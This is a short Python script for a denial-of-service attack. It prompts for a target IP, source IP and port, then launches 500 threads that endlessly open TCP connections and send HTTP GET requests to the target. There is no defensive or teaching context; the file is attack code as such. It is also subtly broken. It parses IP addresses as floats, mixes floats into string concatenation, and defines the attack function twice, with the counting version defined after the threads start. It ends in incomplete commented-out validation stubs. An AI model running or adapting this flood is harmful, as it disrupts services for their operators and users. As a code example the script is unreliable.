import socket
import threading

target_ip = float(input("Enter the target ip address in IPV4 format => "))
source_ip = float(input("Enter the source ip address => "))
port = int(input("Enter the port => "))

def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target_ip, port))
        s.sendto(("GET /" + target_ip + " HTTP/1.1\r\n").encode('ascii'), (target_ip, port))
        s.sendto(("Host: " + source_ip + "\r\n\r\n").encode('ascii'), (target_ip, port))

        s.close()

for i in range(500):
    thread=threading.Thread(target=attack)
    thread.start()

attack_num=0

def attack():
    while True:
        s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target_ip, port))
        s.sendto(("GET /" + target_ip + "HTTP/1.1\r\n").encode('ascii'), (target_ip, port))
        s.sendto(("Host: " + source_ip + "\r\n\r\n").encode('ascii'), (target_ip, port))

        global attack_num
        attack_num+=1
        print(attack_num)

        s.close()


#try:
#    ip = ipaddress.ip_address(sys.argv[1])
#    print('%s is a correct IP%s address.' % (ip, ip.version))
#except ValueError:
#    print('address/netmask is invalid: %s' % sys.argv[1])
#except:
#    print('Usage : %s  ip' % sys.argv[0])


#try:
#    socket.inet_aton(target_ip)
#    socket.inet_aton(source_ip)
#    socket.inet_aton(port)
#    #legal
#except socket.error:
#    #not legal